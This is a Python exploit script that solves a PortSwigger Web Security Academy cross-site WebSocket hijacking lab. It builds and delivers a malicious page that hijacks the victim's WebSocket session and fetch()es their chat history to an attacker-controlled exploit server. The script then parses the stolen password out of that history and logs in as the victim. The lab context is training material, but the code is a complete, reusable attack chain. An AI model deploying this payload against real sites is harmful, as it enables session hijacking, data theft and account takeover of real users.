#!/usr/bin/env python3
"""
Cross-site WebSocket hijacking
PortSwigger Web Security Academy -- WebSockets

Companion script for the writeup: 03-cross-site-websocket-hijacking.md

What this does:
    Builds the CSWSH exploit page, stores it on the lab's exploit server, and
    delivers it to the victim. The page opens a cross-origin WebSocket to the
    vulnerable chat endpoint (the victim's browser attaches their session
    cookie automatically, since the handshake has no CSRF token or Origin
    check), sends "READY" to trigger the chat-history replay, and fetch()es
    each reply -- base64-encoded -- back to the exploit server's own /log
    endpoint (same-origin from the exploit page, so no CORS restriction
    applies to the exfiltration leg). The script then polls that access log,
    decodes the exfiltrated chat history, pulls the victim's credentials out
    of the support agent's "No problem <user>, it's <password>" reply, and
    logs in with them.

Usage:
    python 03-cross-site-websocket-hijacking.py <lab-url>
    e.g. python 03-cross-site-websocket-hijacking.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx

Note:
    We exfiltrate to the exploit server's own /log endpoint rather than Burp
    Collaborator (PortSwigger's official solution uses Collaborator, since it
    doesn't require standing up any logging logic of your own). Both are
    valid -- the vulnerability doesn't care where the stolen data goes.
"""

import base64
import re
import sys
import time
import httpx

EXPLOIT_SERVER_RE = re.compile(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)')


def discover_ws_url(client: httpx.Client, lab_url: str) -> str:
    host = lab_url.split("://", 1)[1].split("/", 1)[0]
    scheme = "wss" if lab_url.startswith("https") else "ws"

    r = client.get(lab_url)
    found = re.findall(r"""new\s+WebSocket\s*\(\s*['"`](wss?://[^'"`]+)['"`]\s*\)""", r.text)
    for url in found:
        if host in url:
            return url

    guess = f"{scheme}://{host}/chat"
    print(f"  [*] No WebSocket URL in page source, guessing: {guess}")
    return guess


def find_exploit_server(client: httpx.Client, lab_url: str) -> str:
    r = client.get(lab_url)
    m = EXPLOIT_SERVER_RE.search(r.text)
    if not m:
        r2 = client.get(f"{lab_url}/chat")
        m = EXPLOIT_SERVER_RE.search(r2.text)
    return m.group(1).rstrip("/") if m else ""


def build_exploit_html(ws_url: str, exploit_server_url: str) -> str:
    return (
        "<script>\n"
        f"var ws = new WebSocket('{ws_url}');\n"
        "ws.onopen = function() {\n"
        "    ws.send('READY');\n"
        "};\n"
        "ws.onmessage = function(event) {\n"
        f"    fetch('{exploit_server_url}/log?data=' + btoa(event.data));\n"
        "};\n"
        "</script>"
    )


def deploy_exploit(client: httpx.Client, exploit_server_url: str, exploit_html: str) -> None:
    store_data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
        "responseBody": exploit_html,
        "formAction": "STORE",
    }
    client.post(exploit_server_url, data=store_data)
    store_data["formAction"] = "DELIVER_TO_VICTIM"
    client.post(exploit_server_url, data=store_data)


def extract_credentials(decoded_messages: list[str]) -> tuple[str | None, str | None]:
    for decoded in decoded_messages:
        clean = decoded.replace("&apos;", "'").replace("&amp;", "&")
        # Support agent's reply follows: "No problem <username>, it's <password>"
        m = re.search(r"No problem (\w+),?\s+it(?:'|')s\s+(\S+)", clean)
        if m:
            return m.group(1), m.group(2)
    return None, None


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, follow_redirects=True, timeout=20)

    ws_url = discover_ws_url(client, lab_url)
    print(f"[*] WebSocket endpoint: {ws_url}")

    print("[*] Looking for the exploit server URL on the lab page...")
    exploit_url = find_exploit_server(client, lab_url)
    if not exploit_url:
        print("[-] No exploit server found -- pass its URL manually and adapt this script.")
        return
    print(f"[*] Exploit server: {exploit_url}")

    exploit_html = build_exploit_html(ws_url, exploit_url)
    print("[*] Built CSWSH exploit page:")
    print(exploit_html)

    print("[*] Storing on the exploit server and delivering to the victim...")
    deploy_exploit(client, exploit_url, exploit_html)

    print("[*] Waiting 10s for the victim to load the page and the WebSocket to replay their chat history...")
    time.sleep(10)

    print("[*] Fetching the exploit server's access log...")
    log_r = client.get(f"{exploit_url}/log")
    data_params = re.findall(r"data=([A-Za-z0-9+/=]+)", log_r.text)

    decoded_messages = []
    for b64 in data_params:
        try:
            decoded = base64.b64decode(b64).decode(errors="replace")
            decoded_messages.append(decoded)
            print(f"[+] Exfiltrated: {decoded[:200]}")
        except Exception as e:
            print(f"[-] Decode error: {e}")

    username, password = extract_credentials(decoded_messages)
    if not (username and password):
        print("[-] No credentials found in the exfiltrated chat history yet -- rerun after the victim visits the page.")
        return
    print(f"[+] Recovered credentials from victim's chat history: {username}:{password}")

    login_page = client.get(f"{lab_url}/login")
    csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
    csrf = csrf_match.group(1) if csrf_match else ""

    login_r = client.post(
        f"{lab_url}/login",
        data={"csrf": csrf, "username": username, "password": password},
    )
    print(f"[*] Logged in as {username}, redirected to: {login_r.url}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- hijacked the victim's WebSocket, stole their chat history and credentials.")
    else:
        print("[-] Not solved yet -- check the access log and credential extraction above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
